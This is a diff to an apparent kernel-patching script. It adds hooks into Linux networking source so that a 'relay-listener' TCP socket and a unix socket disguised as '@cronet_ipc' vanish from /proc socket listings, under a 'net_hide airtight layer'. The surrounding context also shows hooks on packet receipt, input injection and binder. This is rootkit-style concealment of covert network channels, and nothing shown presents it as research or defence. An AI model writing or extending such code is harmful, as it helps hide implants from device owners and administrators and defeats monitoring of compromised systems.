@@ -179,6 +179,27 @@ def e_socket(L):
     op_span(L, "net/socket.c", "int __sys_recvfrom(", "fput_light(sock->file, fput_needed);",
             ["\tlp_recv_hook(fd, ubuf, size, err, false);"], "after")
 
+def e_tcp_ipv6(L):
+    # net_hide airtight layer: skip a relay-listener record in tcp6_seq_show BEFORE
+    # it is formatted (no read-boundary split possible). Insert after `st = seq->private;`
+    # where `sk` is a real socket (SEQ_START_TOKEN already took `goto out`); the hook
+    # reads only sk->sk_num (sock_common, valid for every record state) and goto-out's
+    # the existing `return 0` path to emit nothing.
+    add_include(L)
+    op_span(L, "net/ipv6/tcp_ipv6.c", "static int tcp6_seq_show(struct seq_file *seq, void *v)",
+            "st = seq->private;",
+            ["\tif (lp_tcp_seq_hidden(sk))", "\t\tgoto out;"], "after")
+
+def e_af_unix(L):
+    # net_hide airtight layer: skip the @cronet_ipc oracle record in unix_seq_show
+    # BEFORE formatting. Insert after `struct unix_sock *u = unix_sk(s);` (still inside
+    # the non-SEQ_START_TOKEN else branch, BEFORE unix_state_lock), so the hook holds no
+    # lock when it returns 0 to drop the record.
+    add_include(L)
+    op_span(L, "net/unix/af_unix.c", "static int unix_seq_show(struct seq_file *seq, void *v)",
+            "struct unix_sock *u = unix_sk(s);",
+            ["\t\tif (lp_unix_seq_hidden(s))", "\t\t\treturn 0;"], "after")
+
 def e_input(L):
     add_include(L)
     op_span(L, "drivers/input/input.c", "void input_inject_event(",
@@ -232,6 +253,8 @@ FILES = [
     ("fs/statfs.c", e_statfs),
     ("kernel/sys.c", e_sys),
     ("net/socket.c", e_socket),
+    ("net/ipv6/tcp_ipv6.c", e_tcp_ipv6),
+    ("net/unix/af_unix.c", e_af_unix),
     ("drivers/input/input.c", e_input),
     ("drivers/android/binder.c", e_binder),
     ("drivers/android/binder_alloc.c", e_binder_alloc),
